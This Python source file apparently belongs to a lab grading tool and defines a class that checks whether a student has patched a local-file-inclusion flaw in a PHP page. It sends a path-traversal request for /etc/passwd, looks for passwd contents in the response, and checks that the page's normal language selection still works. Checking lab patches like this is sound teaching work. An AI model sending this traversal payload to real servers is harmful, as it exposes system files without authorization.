import requests
from Exploit import Exploit
import BetterLogger
from BetterLogger import logger

class ChallengeFourLFI(Exploit):
	def __init__(self, ip_address, parsed_config) -> None:
		super().__init__(ip_address=ip_address, parsed_config=parsed_config)

	def run_hellevator(self):
		return super().run_hellevator()

	def run_custom_command(self, command):
		logger.info(f"{self.ip_address} - ChallengeFourLFI does not support running custom commands.")
		return False

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeFourLFI...")
			local_file_path = "../../../../../etc/passwd"
			server_response = requests.get(f"http://{self.ip_address}/lfi/lfi.php?language={local_file_path}", timeout=3)
			server_response_text = server_response.text
			if "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" in server_response_text:
				logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeFourLFI!{BetterLogger.COLOR_END}")
				return True

			# ensure that original functionality is maintained
			language = "urbandictionary"
			server_response = requests.get(f"http://{self.ip_address}/lfi/lfi.php?language={language}", timeout=3)
			server_response_text = server_response.text
			if "The reason most people need a new hard drive" not in server_response_text:
				logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeFourLFI so choosing a language no longer works correctly!{BetterLogger.COLOR_END}")
				return None

			logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeFourLFI.{BetterLogger.COLOR_END}")
			return False
		except requests.ConnectionError:
			logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeFourLFI because the student disabled the apache2 service!{BetterLogger.COLOR_END}")
			return None
		except Exception as err:
			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeFourLFI is vulnerable.{BetterLogger.COLOR_END}")
			logger.exception(err)
			return False
